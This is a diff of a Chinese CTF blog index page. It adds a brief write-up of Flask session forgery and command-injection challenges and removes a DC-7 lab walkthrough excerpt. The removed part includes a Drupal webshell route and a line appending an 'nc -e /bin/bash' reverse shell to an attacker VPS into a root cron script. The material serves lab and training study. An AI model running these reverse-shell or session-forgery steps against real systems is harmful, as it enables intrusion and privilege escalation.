@@ -172,6 +172,57 @@
         
 
 <div class="post">
+    <a href="/2023/06/04/Round#13%20web%E4%B8%93%E9%A1%B9%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">Round#13 web专项部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/a1bf23691f18f7422842fa37da057a66.png" alt="image-20230604100247293"></p>
+<p>忘记密码处有secretkey</p>
+<p>然后就是伪造session了,这里猜一下要什么</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9d75ff2defcc7288b2435d3c35a3c247.png" alt="image-20230604105953099"></p>
+<p>最后应该是<code>_is_admin</code>有用,我没细看,当时平台卡麻了<br>指正:改<code>_user_id</code>为1</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7c978dece0a1ae750913a40c64544289.png" alt="image-20230604105945576"></p>
+<h1 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h1><p>注意到可以拼接命令,但是执行的回显只有数字</p>
+<p>那么可以考虑读取后用od命令来转8进制读取</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/04b75cc59a770e17da91dc934a871934.png" alt="image-20230604121450662"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2328d1a710b5739041db12c5b6ba7f1b.png" alt="image-20230604121516085"></p>
+<h2 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h2><p>这里当时拿到key了,但是被第一题的思路误导了,第一题不用猜伪造什么,因为我一开始<code>user_id</code>改的0,没成功然后乱试什么isadmin之类的<br><code>useri_id</code>改1就行,我早知道改改id试试了<br>这里在登录后看源码有个wor路由<br>去wor路由然后随便弄个非法的<code>session</code>就可以看到key 把报错那个展开<br><img src="https://img-blog.csdnimg.cn/e8644c8d2fdc43168ef26560f5a74e8b.png" alt="在这里插入图片描述"><br><code>hardgam3_C0u1d_u_f1ndM3????</code></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好久没做web了,就出了两个最简单的,现在一看太菜了还是,信息收集那题我不知道只有一个文件读能干什么</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/06/04/Round#13%20web%E4%B8%93%E9%A1%B9%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/06/02/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(2)/">
         <h2 class="post-title">NSS周常刷密码(2)</h2>
     </a>
@@ -462,22 +513,22 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #ffa2c4">python</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
     </div>
@@ -571,12 +622,12 @@ print(long_to_bytes(pow(c,d,a*g)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00bcd4">数学建模</a>
         </span>
         
     </div>
@@ -744,27 +795,27 @@ print(hashlib.md5(flag.encode(&quot;utf-8&quot;)).hexdigest())
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00bcd4">数学建模</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #00a596">php</a>
+            <a href="/tags/php/" style="color: #03a9f4">php</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #00bcd4">linux</a>
+            <a href="/tags/linux/" style="color: #00a596">linux</a>
         </span>
         
     </div>
@@ -1041,12 +1092,12 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #03a9f4">python</a>
+            <a href="/tags/python/" style="color: #ffa2c4">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
         <span class="tag">
@@ -1446,12 +1497,12 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
         </span>
         
         <span class="tag">
@@ -1461,7 +1512,7 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #00a596">linux</a>
+            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
         </span>
         
     </div>
@@ -1509,7 +1560,7 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
@@ -1529,7 +1580,7 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #ff7d73">服务器</a>
+            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #ffa2c4">服务器</a>
         </span>
         
     </div>
@@ -1981,27 +2032,27 @@ print(&#39;LitCTF&#123;&#39;+res+&#39;&#125;&#39;)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/vim/" style="color: #03a9f4">vim</a>
+            <a href="/tags/vim/" style="color: #ffa2c4">vim</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #ffa2c4">数据库</a>
+            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #ff7d73">数据库</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/" style="color: #00bcd4">编辑器</a>
+            <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/" style="color: #03a9f4">编辑器</a>
         </span>
         
     </div>
@@ -2061,17 +2112,17 @@ print(&#39;LitCTF&#123;&#39;+res+&#39;&#125;&#39;)
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ff7d73">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #ffa2c4">php</a>
+            <a href="/tags/php/" style="color: #00bcd4">php</a>
         </span>
         
     </div>
@@ -2134,7 +2185,7 @@ stty -echo raw;fg
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
         </span>
         
         <span class="tag">
@@ -2144,85 +2195,6 @@ stty -echo raw;fg
         
     </div>
     <a href="/2023/05/07/DC-8%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
-        <h2 class="post-title">DC-7通关详解</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/4/30
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/856e0fdcd1034dad80369f7c6a378f8a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/09ea3b35b6dc45dda26125567e714220.png" alt="在这里插入图片描述"></p>
-<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/dc3aabab1bfb4ce9a8233babadef0f77.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3351f2de5fc144339585dce86d62b872.png" alt="在这里插入图片描述"><br>web提示我们说弱口令可能不会奏效</p>
-<p>那么我们就先不考虑弱口令<br>searchsploit搜payload打打看,无果</p>
-<p>看别人的wp知道了是通过web左下角的这个玩意去github搜<br><img src="https://img-blog.csdnimg.cn/cb6316bea7fa424883ae46ddfda57a16.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/372cc29425024a9da80ae91d2737618d.png" alt="在这里插入图片描述"><br>在这个仓库用户唯一的仓库中看config.php<br>发现账号密码</p>
-<p><img src="https://img-blog.csdnimg.cn/f791d54185724161a3049a294a3cee3d.png" alt="在这里插入图片描述"><br>尝试后台和ssh登录</p>
-<p>ssh登录成功</p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>当前目录下发现mbox和backup文件夹<br>看看都是什么<br>backup目录下是俩挺大的压缩包<br>cat 一下mbox<br><img src="https://img-blog.csdnimg.cn/2163c3c2ce0649a1ba953b30a77f2472.png" alt="在这里插入图片描述"></p>
-<p>然后看看<code>/opt/scripts/backups.sh</code></p>
-<p><img src="https://img-blog.csdnimg.cn/5c3b63ddef6346ebb1ba9dd7b966a7ce.png" alt="在这里插入图片描述"><br>没什么用,我们写不了该文件,但是发现www-data组可写<br>没思路了,也不能su过去,回头看一眼wp</p>
-<p>发现<code>/home/dc7user</code>目录下还存在一个<code>.drush</code>目录,当时根本没在意,没怎么见过这东西<br>drush是个命令,可以管理drupal</p>
-<p>cd到&#x2F;var&#x2F;www&#x2F;html下<br><img src="https://img-blog.csdnimg.cn/5ae9faba33c4494396f89366c5c292f8.png" alt="在这里插入图片描述"></p>
-<p>改admin的密码,用web弹个shell<br>和之前做的drupal的站一样,去扩展里找支持php解析的扩展,给他启用<br>发现这里没有,去下一个<br><code>https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz </code><br>装完后启用,然后写一句话反弹shell<br>优化shell</p>
-<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
-ctrl+z
-stty -echo raw;fg
-</code></pre>
-<p>现在有写的权限,在sh文件最后追加一个命令<br>等这个命令被root执行生成一个shell</p>
-<pre><code class="bash">echo &quot;nc -e /bin/bash vps地址 9000&quot; &gt;&gt; backups.sh
-</code></pre>
-<p>等15分钟,每15分钟执行一次,可以用date命令查看大概差多长时间<br>最好先自己手动执行看看能不能反弹上,省得再等15分钟<br><img src="https://img-blog.csdnimg.cn/9f1e88d95e0448d4886b247e0024a40b.png" alt="在这里插入图片描述"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/php/" style="color: #ffa2c4">php</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/linux/" style="color: #03a9f4">linux</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/ssh/" style="color: #ffa2c4">ssh</a>
-        </span>
-        
-    </div>
-    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -2238,6 +2210,8 @@ stty -echo raw;fg
     
     <a class="page-num" href="/page/7">7</a>
     
+    
+    <a class="page-num" href="/page/8">8</a>
     
     
     
